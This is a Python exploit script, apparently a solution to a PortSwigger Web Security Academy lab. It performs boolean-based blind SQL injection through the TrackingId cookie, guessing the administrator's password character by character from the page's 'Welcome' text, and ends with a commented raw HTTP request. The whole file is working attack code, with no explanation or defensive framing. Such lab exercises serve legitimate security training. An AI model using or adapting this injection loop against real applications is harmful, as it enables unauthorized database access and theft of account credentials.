import requests as req
import os

def makeHeaders(payload):
	cookie = {
		'TrackingId' : f"5xx03vlKGlgakLxA' AND {payload}",
		'session':'r02Tilg8LkyUYVQIJCIvTyXxs5ZQexJe'
	}

	headers = {
		'Host':'0a26000e036d8839811b211b00d800fa.web-security-academy.net',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
		'Accept-Language':'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding':'gzip, deflate, br',
		'Referer':'https://portswigger.net/',
		'Upgrade-Insecure-Requests':'1',
		'Sec-Fetch-Dest':'document',
		'Sec-Fetch-Mode':'navigate',
		'Sec-Fetch-Site':'cross-site',
		'Sec-Fetch-User':'?1',
		'Te':'trailers'
	}

	info = [
		cookie,
		headers
	]

	return info


wordlist = [
	'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
	'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
	'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6',
	'7', '8', '9', '10'
]

password = ''
count = 1

os.system('cls')
print("[*] Executing...")
while count <= 21:
	for c in wordlist:
		payload = f"(SELECT SUBSTRING(password, {count}, 1) FROM users WHERE username='administrator')='{c}"
		cookies, headers =  makeHeaders(payload)

		response = req.get(
			'https://0a26000e036d8839811b211b00d800fa.web-security-academy.net/',
			 headers=headers,
			 cookies=cookies
		)

		words = response.text.split()

		foi = False
		for word in words:
			if word == 	'<div>Welcome':
				foi = True
				break

		if foi:
			os.system('cls')
			print(f"Password: {password}")
			password += c;

	count+=1

print("\n")
print(f"[+] Password found: {password}")

# GET / HTTP/2
# Host: 0ae9009f0433ebfb82573d8500720096.web-security-academy.net
# Cookie: TrackingId=5hB9N1SaZMh6oWpa; session=aJIXny1X37jxtLHXgSmimuW5jHfZLoV0
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
# Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
# Accept-Encoding: gzip, deflate, br
# Referer: https://portswigger.net/
# Upgrade-Insecure-Requests: 1
# Sec-Fetch-Dest: document
# Sec-Fetch-Mode: navigate
# Sec-Fetch-Site: cross-site
# Sec-Fetch-User: ?1
# Te: trailers

